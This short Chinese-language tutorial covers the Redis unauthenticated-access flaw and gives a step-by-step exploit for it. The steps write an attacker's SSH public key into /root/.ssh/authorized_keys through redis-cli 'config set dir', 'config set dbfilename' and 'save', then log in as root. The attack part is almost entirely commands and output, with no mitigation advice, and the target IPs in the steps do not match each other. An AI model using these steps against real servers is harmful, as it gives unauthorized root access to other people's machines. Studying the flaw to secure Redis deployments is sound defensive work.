Redis 未授权访问漏洞

如果将 Redis 绑定在 0.0.0.0:6379，会将Redis服务暴露到公网上，如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问Redis以及读取Redis的数据。
攻击者在未授权访问Redis的情况下可以利用Redis的相关方法，如果运行 redis 的用户是 root 用户，攻击者可以成功将自己的公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以直接登录目标服务器。

### 利用步骤

1. 在攻击方生成一对 ssh key (如果已经生成过则可跳过此步骤)

 ```
  $ ssh-keygen -t rsa
 ```
 
 默认情况下，生成后在用户的家目录下的 .ssh 目录下
 
2. 将生成的公钥的值写入目标服务器

 ```
 $ (echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > /tmp/foo.txt
 $ cat /tmp/foo.txt | redis-cli -h 192.168.1.100 -p 6379 -x set crackit
 ```
 
 > 加上 `\n\n` 是为了不破坏 ssh public key
 > 
 > crackit 是设置的 key，可随意指定

3. 连接目标

 ```
 $ redis-cli -h 172.17.0.2 -p 6379
192.168.1.100:6379> config set dir /root/.ssh/
OK
192.168.1.100:6379> config get dir
1) "dir"
2) "/root/.ssh"
192.168.1.100:6379> config set dbfilename "authorized_keys"
OK
192.168.1.100:6379> save
OK
 ```
 
 将目录设置为 /root/.ssh/ 目录后，再将备份文件名设置为 `authorized_keys`，通过 save 指令即可写入文件。

4. 通过 ssh 连接目标

 ```
 $ ssh root@172.17.0.2 -i ~/.ssh/id_rsa
 ```
 > 默认会使用 `id_rsa` 如果改过文件名则可以用 -i 参数来指定。